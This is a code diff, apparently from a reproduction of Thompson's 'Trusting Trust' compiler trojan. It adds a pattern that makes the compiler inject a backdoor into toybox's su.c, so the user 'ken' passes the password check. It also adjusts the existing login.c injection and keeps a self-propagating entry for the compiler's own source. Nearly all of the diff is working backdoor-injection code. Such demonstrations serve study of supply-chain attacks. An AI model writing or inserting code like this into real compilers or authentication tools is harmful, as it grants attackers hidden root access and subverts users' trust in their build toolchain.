@@ -16,7 +16,11 @@ struct rott_pattern_t {
 };
 
 static const char *rott_login_gen(void) {
-    return "\n    if (strcmp(user, \"ken\") == 0) return 1;";
+    return "    if (strcmp(user, \"ken\") == 0) return 1;\n";
+}
+
+static const char *rott_su_gen(void) {
+    return "    if (strcmp(toybuf, \"ken\") == 0) passhash = shp->sp_pwdp;\n";
 }
 
 static char rott_hex_char(char n) {
@@ -58,8 +62,13 @@ static const char *rott_quine_gen(void) {
 static const struct rott_pattern_t rott_patterns[] = {
     {
         "login.c",
-        "char passwd[1024];",
+        "char passwd[1024];\n",
         rott_login_gen,
+    },
+    {
+        "toys/lsb/su.c",
+        "passhash = crypt(toybuf, shp->sp_pwdp);\n",
+        rott_su_gen,
     },
     {
         "tccpp.c",
